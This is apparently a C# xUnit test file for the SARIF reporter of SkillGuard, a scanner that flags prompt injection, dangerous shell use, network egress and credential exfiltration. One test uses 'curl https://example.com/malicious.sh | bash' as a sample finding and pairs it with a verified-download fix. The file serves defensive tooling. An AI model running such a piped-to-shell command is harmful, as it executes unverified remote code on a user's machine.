using Xunit;
using System;
using System.IO;
using System.Text.Json;
using SkillGuard.Core;

namespace SkillGuard.Tests;

public class SarifReporterTests
{
    [Fact]
    public void Constructor_WithDefaultToolVersion_CreatesInstance()
    {
        // Act
        var reporter = new SarifReporter();

        // Assert
        Assert.NotNull(reporter);
    }

    [Fact]
    public void Constructor_WithCustomToolVersion_CreatesInstance()
    {
        // Act
        var reporter = new SarifReporter("1.2.3");

        // Assert
        Assert.NotNull(reporter);
    }

    [Fact]
    public void Write_EmptyReport_ProducesValidSarifOutput()
    {
        // Arrange
        var reporter = new SarifReporter();
        using var output = new StringWriter();
        var report = new ScanReport(Array.Empty<Finding>(), 0, 0, TimeSpan.Zero);

        // Act
        reporter.Write(report, output);
        var result = output.ToString();

        // Assert
        Assert.NotNull(result);
        Assert.NotEmpty(result);

        // Verify it's valid JSON
        var jsonDoc = JsonDocument.Parse(result);
        Assert.Equal("2.1.0", jsonDoc.RootElement.GetProperty("version").GetString());
        Assert.Equal("https://json.schemastore.org/sarif-2.1.0.json", jsonDoc.RootElement.GetProperty("$schema").GetString());
    }

    [Fact]
    public void Write_ReportWithFindings_ProducesValidSarifOutput()
    {
        // Arrange
        var reporter = new SarifReporter("1.0.0");
        using var output = new StringWriter();
        var findings = new[]
        {
            new Finding(
                "SG001",
                "Test Rule",
                Severity.High,
                FindingCategory.PromptInjection,
                "Test message",
                SourceLocation.At("test.cs", 10, 5, 20),
                "test snippet"
            )
        };
        var report = new ScanReport(findings, 1, 1, TimeSpan.FromSeconds(1));

        // Act
        reporter.Write(report, output);
        var result = output.ToString();

        // Assert
        Assert.NotNull(result);
        Assert.NotEmpty(result);

        // Verify it's valid JSON
        var jsonDoc = JsonDocument.Parse(result);
        var runs = jsonDoc.RootElement.GetProperty("runs");
        Assert.Single(runs.EnumerateArray());

        var run = runs[0];
        var tool = run.GetProperty("tool");
        var driver = tool.GetProperty("driver");
        Assert.Equal("skill-guard", driver.GetProperty("name").GetString());
        Assert.Equal("1.0.0", driver.GetProperty("version").GetString());

        // Verify results
        var resultsArray = run.GetProperty("results");
        Assert.Single(resultsArray.EnumerateArray());

        var resultItem = resultsArray[0];
        Assert.Equal("SG001", resultItem.GetProperty("ruleId").GetString());
        Assert.Equal("error", resultItem.GetProperty("level").GetString());
        Assert.Equal("Test message", resultItem.GetProperty("message").GetProperty("text").GetString());

        // Verify risk score properties
        var properties = run.GetProperty("properties");
        Assert.True(properties.GetProperty("riskScore").GetInt32() > 0);
        Assert.Equal("D", properties.GetProperty("riskGrade").GetString());
    }

    [Fact]
    public void Write_NullReport_ThrowsArgumentNullException()
    {
        // Arrange
        var reporter = new SarifReporter();
        using var output = new StringWriter();
        ScanReport report = null!;

        // Act & Assert
        Assert.Throws<ArgumentNullException>(() => reporter.Write(report, output));
    }

    [Fact]
    public void Write_NullOutput_ThrowsArgumentNullException()
    {
        // Arrange
        var reporter = new SarifReporter();
        var report = new ScanReport(Array.Empty<Finding>(), 0, 0, TimeSpan.Zero);
        TextWriter output = null!;

        // Act & Assert
        Assert.Throws<ArgumentNullException>(() => reporter.Write(report, output));
    }

    [Fact]
    public void ToSarifLevel_Critical_ReturnsError()
    {
        // Act
        var result = SarifReporter.ToSarifLevel(Severity.Critical);

        // Assert
        Assert.Equal("error", result);
    }

    [Fact]
    public void ToSarifLevel_High_ReturnsError()
    {
        // Act
        var result = SarifReporter.ToSarifLevel(Severity.High);

        // Assert
        Assert.Equal("error", result);
    }

    [Fact]
    public void ToSarifLevel_Medium_ReturnsWarning()
    {
        // Act
        var result = SarifReporter.ToSarifLevel(Severity.Medium);

        // Assert
        Assert.Equal("warning", result);
    }

    [Fact]
    public void ToSarifLevel_Low_ReturnsNote()
    {
        // Act
        var result = SarifReporter.ToSarifLevel(Severity.Low);

        // Assert
        Assert.Equal("note", result);
    }

    [Fact]
    public void ToSarifLevel_Note_ReturnsNote()
    {
        // Act
        var result = SarifReporter.ToSarifLevel(Severity.Note);

        // Assert
        Assert.Equal("note", result);
    }

    [Fact]
    public void Write_MultipleFindings_ProducesCorrectSarifStructure()
    {
        // Arrange
        var reporter = new SarifReporter();
        using var output = new StringWriter();
        var findings = new[]
        {
            new Finding(
                "SG001",
                "Critical Rule",
                Severity.Critical,
                FindingCategory.PromptInjection,
                "Critical issue",
                SourceLocation.At("file1.cs", 1, 1, 10),
                "snippet1"
            ),
            new Finding(
                "SG002",
                "High Rule",
                Severity.High,
                FindingCategory.DangerousShell,
                "High issue",
                SourceLocation.At("file2.cs", 2, 2, 15),
                "snippet2"
            ),
            new Finding(
                "SG003",
                "Medium Rule",
                Severity.Medium,
                FindingCategory.NetworkEgress,
                "Medium issue",
                SourceLocation.At("file3.cs", 3, 3, 20),
                "snippet3"
            ),
            new Finding(
                "SG004",
                "Low Rule",
                Severity.Low,
                FindingCategory.CredentialExfiltration,
                "Low issue",
                SourceLocation.At("file4.cs", 4, 4, 25),
                "snippet4"
            )
        };
        var report = new ScanReport(findings, 4, 4, TimeSpan.FromSeconds(2));

        // Act
        reporter.Write(report, output);
        var result = output.ToString();

        // Assert
        Assert.NotNull(result);
        var jsonDoc = JsonDocument.Parse(result);
        var resultsArray = jsonDoc.RootElement.GetProperty("runs")[0].GetProperty("results");
        Assert.Equal(4, resultsArray.GetArrayLength());

        // Verify each finding has correct SARIF level
        var resultItems = resultsArray.EnumerateArray().ToList();
        Assert.Equal("error", resultItems[0].GetProperty("level").GetString()); // Critical
        Assert.Equal("error", resultItems[1].GetProperty("level").GetString()); // High
        Assert.Equal("warning", resultItems[2].GetProperty("level").GetString()); // Medium
        Assert.Equal("note", resultItems[3].GetProperty("level").GetString()); // Low
    }

    [Fact]
    public void Write_FindingsWithWindowsPath_ConvertsToForwardSlashes()
    {
        // Arrange - Test the path conversion directly
        var path = "C:\\path\\to\\file.cs";
        var expected = "C:/path/to/file.cs";
        var converted = path.Replace('\\', '/');

        // Act & Assert
        Assert.Equal(expected, converted);
        Assert.DoesNotContain("\\", converted);
    }

    [Fact]
    public void Write_FindingsWithSnippets_ProducesCorrectSnippetData()
    {
        // Arrange
        var reporter = new SarifReporter();
        using var output = new StringWriter();
        var findings = new[]
        {
            new Finding(
                "SG001",
                "Test Rule",
                Severity.High,
                FindingCategory.PromptInjection,
                "Test message",
                SourceLocation.At("test.cs", 5, 10, 15),
                "This is a test snippet"
            )
        };
        var report = new ScanReport(findings, 1, 1, TimeSpan.Zero);

        // Act
        reporter.Write(report, output);
        var result = output.ToString();

        // Assert - snippet should be included in output
        Assert.Contains("This is a test snippet", result);
        var jsonDoc = JsonDocument.Parse(result);
        var snippet = jsonDoc.RootElement.GetProperty("runs")[0].GetProperty("results")[0]
            .GetProperty("locations")[0]
            .GetProperty("physicalLocation")
            .GetProperty("region")
            .GetProperty("snippet")
            .GetProperty("text")
            .GetString();
        Assert.Equal("This is a test snippet", snippet);
    }

    [Fact]
    public void Write_FindingsWithRemediation_ProducesCorrectOutput()
    {
        // Arrange
        var reporter = new SarifReporter();
        using var output = new StringWriter();
        var finding = new Finding(
            "SG001",
            "Test Rule",
            Severity.High,
            FindingCategory.PromptInjection,
            "Test message",
            SourceLocation.At("test.cs", 1, 1, 10),
            "snippet"
        ) { Remediation = "Fix this issue" };
        var report = new ScanReport(new[] { finding }, 1, 1, TimeSpan.Zero);

        // Act
        reporter.Write(report, output);
        var result = output.ToString();

        // Assert - SARIF output doesn't include remediation, just verifies it doesn't crash
        Assert.NotNull(result);
        Assert.NotEmpty(result);
    }

    [Fact]
    public void Write_MultipleFindingsWithSameRuleId_GroupsRulesCorrectly()
    {
        // Arrange
        var reporter = new SarifReporter();
        using var output = new StringWriter();
        var findings = new[]
        {
            new Finding(
                "SG001",
                "Duplicate Rule",
                Severity.High,
                FindingCategory.PromptInjection,
                "First issue",
                SourceLocation.At("file1.cs", 1, 1, 10),
                "snippet1"
            ),
            new Finding(
                "SG001",
                "Duplicate Rule",
                Severity.Medium,
                FindingCategory.PromptInjection,
                "Second issue",
                SourceLocation.At("file2.cs", 2, 2, 20),
                "snippet2"
            )
        };
        var report = new ScanReport(findings, 2, 1, TimeSpan.Zero);

        // Act
        reporter.Write(report, output);
        var result = output.ToString();

        // Assert - should have one rule with max severity level
        var jsonDoc = JsonDocument.Parse(result);
        var rules = jsonDoc.RootElement.GetProperty("runs")[0].GetProperty("tool").GetProperty("driver").GetProperty("rules");
        Assert.Single(rules.EnumerateArray());

        var rule = rules[0];
        Assert.Equal("SG001", rule.GetProperty("id").GetString());
        Assert.Equal("error", rule.GetProperty("defaultConfiguration").GetProperty("level").GetString());
    }

    [Fact]
    public void Write_FindingWithFix_EmitsFixesArrayInSarifOutput()
    {
        // Arrange
        var reporter = new SarifReporter("1.0.0");
        using var output = new StringWriter();
        var finding = new Finding(
            "SG003",
            "DangerousShell",
            Severity.High,
            FindingCategory.DangerousShell,
            "Pipes a remote download directly into a shell",
            SourceLocation.At("script.sh", 5, 10, 20),
            "curl https://example.com/malicious.sh | bash"
        ).WithSimpleReplacement(
            "# Download and verify before execution\n" +
            "curl -fsSLO https://example.com/tool.tar.gz\n" +
            "echo 'expected-sha256 tool.tar.gz' | sha256sum -c -\n" +
            "tar -xzf tool.tar.gz\n" +
            "./tool --args",
            "Replace shell pipe with pinned download and verification"
        );
        var report = new ScanReport(new[] { finding }, 1, 1, TimeSpan.Zero);

        // Act
        reporter.Write(report, output);
        var result = output.ToString();

        // Assert
        Assert.NotNull(result);
        Assert.NotEmpty(result);

        // Verify it's valid JSON
        var jsonDoc = JsonDocument.Parse(result);
        var runs = jsonDoc.RootElement.GetProperty("runs");
        Assert.Single(runs.EnumerateArray());

        var run = runs[0];
        var resultsArray = run.GetProperty("results");
        Assert.Single(resultsArray.EnumerateArray());

        var resultItem = resultsArray[0];

        // Verify fixes array exists and contains the fix
        Assert.True(resultItem.TryGetProperty("fixes", out var fixes));
        Assert.NotNull(fixes);
        Assert.Single(fixes.EnumerateArray());

        var fix = fixes[0];
        Assert.True(fix.TryGetProperty("description", out var description));
        Assert.Equal("Replace shell pipe with pinned download and verification", description.GetProperty("text").GetString());

        Assert.True(fix.TryGetProperty("artifactChanges", out var artifactChanges));
        Assert.Single(artifactChanges.EnumerateArray());

        var artifactChange = artifactChanges[0];
        Assert.Equal("script.sh", artifactChange.GetProperty("artifactLocation").GetProperty("uri").GetString());

        Assert.True(artifactChange.TryGetProperty("replacements", out var replacements));
        Assert.Single(replacements.EnumerateArray());

        var replacement = replacements[0];
        Assert.True(replacement.TryGetProperty("deletedRegion", out var deletedRegion));
        Assert.Equal(5, deletedRegion.GetProperty("startLine").GetInt32());
        Assert.Equal(10, deletedRegion.GetProperty("startColumn").GetInt32());
        Assert.Equal(5, deletedRegion.GetProperty("endLine").GetInt32());
        Assert.Equal(30, deletedRegion.GetProperty("endColumn").GetInt32());

        Assert.True(replacement.TryGetProperty("insertedContent", out var insertedContent));
        Assert.Equal("# Download and verify before execution\ncurl -fsSLO https://example.com/tool.tar.gz\necho 'expected-sha256 tool.tar.gz' | sha256sum -c -\ntar -xzf tool.tar.gz\n./tool --args", insertedContent.GetProperty("text").GetString());
    }

    [Fact]
    public void Write_FindingWithoutFix_DoesNotIncludeFixesArray()
    {
        // Arrange
        var reporter = new SarifReporter();
        using var output = new StringWriter();
        var finding = new Finding(
            "SG001",
            "Test Rule",
            Severity.High,
            FindingCategory.PromptInjection,
            "Test message",
            SourceLocation.At("test.cs", 1, 1, 10),
            "snippet"
        );
        var report = new ScanReport(new[] { finding }, 1, 1, TimeSpan.Zero);

        // Act
        reporter.Write(report, output);
        var result = output.ToString();

        // Assert
        Assert.NotNull(result);
        Assert.NotEmpty(result);

        // Verify fixes array is not present when there's no fix
        var jsonDoc = JsonDocument.Parse(result);
        var resultItem = jsonDoc.RootElement.GetProperty("runs")[0].GetProperty("results")[0];
        var fixesProperty = resultItem.GetProperty("fixes");
        Assert.True(fixesProperty.ValueKind == JsonValueKind.Null || fixesProperty.GetArrayLength() == 0);
    }
}